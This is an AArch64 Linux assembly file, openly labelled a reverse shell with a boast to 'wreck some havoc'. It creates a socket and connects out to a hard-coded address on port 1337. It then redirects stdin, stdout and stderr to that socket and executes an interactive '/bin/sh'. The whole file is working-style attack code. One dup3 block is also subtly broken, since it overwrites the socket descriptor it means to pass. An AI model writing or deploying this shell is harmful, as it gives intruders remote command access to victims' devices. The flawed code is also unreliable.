.section .data
prompt: .ascii "[!] ARM ASM Reverse Shell by Xyco [!]\n"
prompt_len = . - prompt
welcome: .ascii "[+] We're in... time to wreck some havoc [!]\n"
welcome_len = . - welcome

sockaddr:
        .ascii "\x02\x00"       // AF_INET
        .ascii "\x05\x39"       // port number 1337 
        .byte 0,0,0,0           // IP Address 
shell:
        .ascii "/bin/sh\0"

shell_args:
        .quad shell
        .quad shell_interactive
        .quad 0

shell_interactive:
        .ascii "-i\0"

.section .text
.global _start
_start:

// socket(2, 1, 0) 
        mov   x0, #2
	mov   x1, #1
	mov   x2, #0
	mov   w8, #198
	svc   0                 // x0 = resultant sockfd 
	mov   x4, x0            // save sockfd in x4 

// connect(r0, &sockaddr, 16) 
	mov   x0, x4            // write 0 for AF_INET 
        adr   x1, sockaddr      // pointer to address, port 
        mov   x2, #16
        mov   w8, #203          // x8 = 203 (connect)
        svc   0

// dup3(sockfd, 0, 0) 
          
        mov   x0, x4            // x4 is the saved sockfd 
        mov   x1, #0            // x1 = 0 (stdin)
        mov   x2, #0            // x2 = 0
        mov   w8, #24          
        svc   0

// dup3(sockfd, 1, 0) 
        mov   x0, x4           // x4 is the saved sockfd 
        mov   x1, #1           // x1 = 1 (stdout) 
        mov   x0, #0           // x2 = 0 
        svc   0

// dup3(sockfd, 2, 0) 
        mov   x0, x4          // x4 is the saved sockfd 
        mov   x1, #2          // x1 = 2 (stderr)
        mov   x2, #0          // x2 =
        svc   0

// write() for prompt
display_prompt:
	mov x0, #1
	adr x1, prompt
	ldr x2, =prompt_len
	mov w8, #64
	svc 0

// write() for welcome
	mov x0, #1
	adr x1, welcome
	ldr x2, =welcome_len
	mov w8, #64
	svc 0

// execve("/bin/sh -i",0,0) 
        adr   x0, shell
	adr   x1, shell_args
        mov   x2, #0
        mov   w8, #221       // x8 = 221 (execve) 
        svc   0

